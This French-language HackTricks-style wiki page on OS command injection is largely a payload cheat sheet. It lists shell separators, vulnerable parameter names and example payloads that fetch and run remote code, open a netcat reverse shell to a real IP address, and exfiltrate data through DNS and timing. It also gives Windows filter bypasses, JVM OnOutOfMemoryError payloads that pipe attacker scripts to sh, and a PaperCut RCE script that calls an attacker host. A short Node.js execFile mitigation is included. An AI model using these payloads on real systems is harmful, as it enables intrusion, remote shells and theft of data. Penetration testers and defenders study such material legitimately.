# Command Injection

{{#include ../banners/hacktricks-training.md}}

## Qu'est-ce que command Injection ?

Une **command injection** permet l'exécution de commandes arbitraires du système d'exploitation par un attaquant sur le serveur hébergeant une application. En conséquence, l'application et toutes ses données peuvent être entièrement compromises. L'exécution de ces commandes permet généralement à l'attaquant d'obtenir un accès non autorisé ou le contrôle de l'environnement de l'application et du système sous-jacent.

### Contexte

Selon l'endroit **où votre saisie est injectée**, il peut être nécessaire de **terminer le contexte entre guillemets** (en utilisant `"` ou `'`) avant les commandes.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Limitation** Bypasses

Si vous cherchez à exécuter **des commandes arbitraires sur une machine linux**, vous serez intéressé par la lecture de ces **Bypasses :**


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Exemples**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Paramètres

Voici les 25 principaux paramètres susceptibles d'être vulnérables à code injection et à des vulnérabilités RCE similaires (d'après [link](https://twitter.com/trbughunters/status/1283133356922884096)) :
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Exfiltration de données basée sur le temps

Extraction de données : caractère par caractère
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### Exfiltration de données basée sur le DNS

Basé sur l'outil disponible sur `https://github.com/HoLyVieR/dnsbin`, également hébergé sur dnsbin.zhack.ca
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Outils en ligne pour vérifier DNS based data exfiltration :

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Lorsque vous auditez des back-ends JavaScript/TypeScript, vous rencontrerez souvent l'API Node.js `child_process`.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` lance un **shell** (`/bin/sh -c`), donc tout caractère ayant une signification spéciale pour le shell (back-ticks, `;`, `&&`, `|`, `$()`, …) entraînera une **command injection** lorsque l'entrée utilisateur est concaténée dans la chaîne.

**Mitigation:** utilisez `execFile()` (ou `spawn()` sans l'option `shell`) et fournissez **chaque argument en tant qu'élément séparé du tableau** afin qu'aucun shell ne soit impliqué :
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

### Injection d'arguments/options via un tiret en tête (argv, no shell metacharacters)

Toutes les injections ne nécessitent pas de shell metacharacters. Si l'application passe des chaînes non fiables comme arguments à un utilitaire système (même avec `execve`/`execFile` et sans shell), beaucoup de programmes continueront d'interpréter tout argument commençant par `-` ou `--` comme une option. Cela permet à un attaquant de changer de mode, modifier des chemins de sortie ou déclencher des comportements dangereux sans jamais accéder à un shell.

Endroits typiques où cela apparaît :

- Interfaces web embarquées/gestionnaires CGI qui construisent des commandes comme `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, etc.
- Routeurs CGI centralisés (par ex., `/cgi-bin/<something>.cgi` avec un paramètre sélecteur comme `topicurl=<handler>`) où plusieurs handlers réutilisent le même validateur faible.

À essayer :

- Fournir des valeurs commençant par `-`/`--` pour qu'elles soient consommées comme flags par l'outil en aval.
- Abuser des flags qui changent le comportement ou écrivent des fichiers, par exemple :
  - `ping`: `-f`/`-c 100000` pour stresser l'appareil (DoS)
  - `curl`: `-o /tmp/x` pour écrire des chemins arbitraires, `-K <url>` pour charger une config contrôlée par l'attaquant
  - `tcpdump`: `-G 1 -W 1 -z /path/script.sh` pour obtenir une exécution post-rotation dans des wrappers non sécurisés
- Si le programme supporte `--` end-of-options, tenter de contourner des mitigations naïves qui préfixent `--` au mauvais endroit.

Modèles de PoC génériques contre les dispatchers CGI centralisés :
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
### Callbacks de diagnostic JVM pour exécution garantie

Tout mécanisme qui vous permet d'**injecter des arguments de ligne de commande JVM** (`_JAVA_OPTIONS`, launcher config files, `AdditionalJavaArguments` fields in desktop agents, etc.) peut être transformé en un RCE fiable sans toucher le bytecode de l'application :

1. **Forcer un crash déterministe** en réduisant le metaspace ou le heap : `-XX:MaxMetaspaceSize=16m` (ou un `-Xmx` minuscule). Cela garantit un `OutOfMemoryError` même pendant le bootstrap précoce.
2. **Attacher un hook d'erreur** : `-XX:OnOutOfMemoryError="<cmd>"` ou `-XX:OnError="<cmd>"` exécute une commande OS arbitraire chaque fois que la JVM s'arrête.
3. Ajouter optionnellement `-XX:+CrashOnOutOfMemoryError` pour éviter les tentatives de récupération et garder le payload en one-shot.

Exemples de payloads:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```
Because these diagnostics are parsed by the JVM itself, no shell metacharacters are required and the command runs with the same integrity level as the launcher. Desktop IPC bugs that forward user-supplied JVM flags (see [Localhost WebSocket abuse](websocket-attacks.md#localhost-websocket-abuse--browser-port-discovery)) therefore translate directly into OS command execution.

## PaperCut NG/MF SetupCompleted auth bypass -> print scripting RCE

- Des builds NG/MF vulnérables (par ex., 22.0.5 Build 63914) exposent `/app?service=page/SetupCompleted` ; en y naviguant et en cliquant sur **Login**, on obtient un `JSESSIONID` valide sans identifiants (authentication bypass dans le flux d'installation).
- Dans **Options → Config Editor**, définissez `print-and-device.script.enabled=Y` et `print.script.sandboxed=N` pour activer le printer scripting et désactiver le sandbox.
- Dans l'onglet **Scripting** de l'imprimante, activez le script et laissez `printJobHook` défini pour éviter les erreurs de validation, mais placez le payload **outside** de la fonction afin qu'il s'exécute immédiatement lorsque vous cliquez sur **Apply** (no print job needed) :
```js
function printJobHook(inputs, actions) {}
cmd = ["bash","-c","curl http://attacker/hit"];
java.lang.Runtime.getRuntime().exec(cmd);
```
- Remplacez le callback par une reverse shell ; si l'UI/PoC ne peut pas gérer les pipes/redirects, stage a payload avec une commande unique, puis exec la commande via une seconde requête.
- Le script de Horizon3, [CVE-2023-27350.py](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py), automatise l'auth bypass, les config flips, la command execution et le rollback — faites-le passer par un upstream proxy (par ex., `proxychains` → Squid) lorsque le service n'est accessible qu'en interne.

## Liste de détection Brute-Force


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## Références

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)
- [PaperCut NG/MF SetupCompleted auth bypass → print scripting RCE](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [CVE-2023-27350.py (auth bypass + print scripting automation)](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py)

{{#include ../banners/hacktricks-training.md}}
